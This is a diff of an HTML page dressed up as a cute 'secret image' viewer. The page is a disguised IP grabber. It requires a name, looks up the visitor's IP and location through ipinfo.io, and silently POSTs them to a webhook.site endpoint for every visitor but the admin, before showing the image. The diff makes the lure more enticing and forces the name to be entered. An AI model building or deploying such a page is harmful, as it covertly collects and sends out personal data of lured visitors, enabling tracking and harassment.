@@ -1,10 +1,12 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Image Viewer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✨ View Our Super Cute Secret Image ✨</title>
     <style>
         body {
-            font-family: Comic Sans MS, cursive;
+            font-family: 'Comic Sans MS', cursive;
             text-align: center;
             background-color: #ffe6f2;
             padding: 20px;
@@ -29,6 +31,7 @@
             border: 2px solid hotpink;
             border-radius: 10px;
             width: 250px;
+            margin-top: 10px;
         }
         button {
             padding: 10px 20px;
@@ -62,8 +65,7 @@
             <div id="error" class="error"></div>
         </div>
         
-        <!-- Valid working image -->
-        <img id="user-image" src="https://i.imgur.com/VAjO7oh.jpg" alt="UwU E-Girl + Furry Combo">
+        <img id="user-image" src="https://i.imgur.com/TMqC1JF.png" alt="UwU E-Girl + Furry Combo">
     </div>
 
     <script>
@@ -71,16 +73,16 @@
 
         async function handleSubmission() {
             const userNameInput = document.getElementById('userName');
-            const userName = userNameInput.value.trim();
+            const userName = userNameInput.value.trim() || "UwU Nobody";
             const errorBox = document.getElementById('error');
-
-            if (!userName) {
-                errorBox.textContent = "Please enter your name first! 💢";
+            
+            if (!userName || userName === "UwU Nobody") {
+                errorBox.textContent = "Please enter a valid name first! 💢";
                 userNameInput.focus();
                 return;
             }
 
-            errorBox.textContent = "";
+            errorBox.textContent = ""; // Clear error if valid name
 
             try {
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
@@ -96,6 +98,7 @@
                     time: new Date().toISOString()
                 };
 
+                // If viewer isn't admin, send log via webhook
                 if (ipData.ip !== ADMIN_IP) {
                     fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
                         method: "POST",
@@ -104,12 +107,12 @@
                     });
                 }
 
+                // Display image and hide form
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
-
             } catch (e) {
-                document.getElementById('user-image').style.display = 'block';
-                document.getElementById('name-form').style.display = 'none';
+                console.error("Error fetching IP data:", e);
+                errorBox.textContent = "Something went wrong. Please try again later. 💔";
             }
         }
 
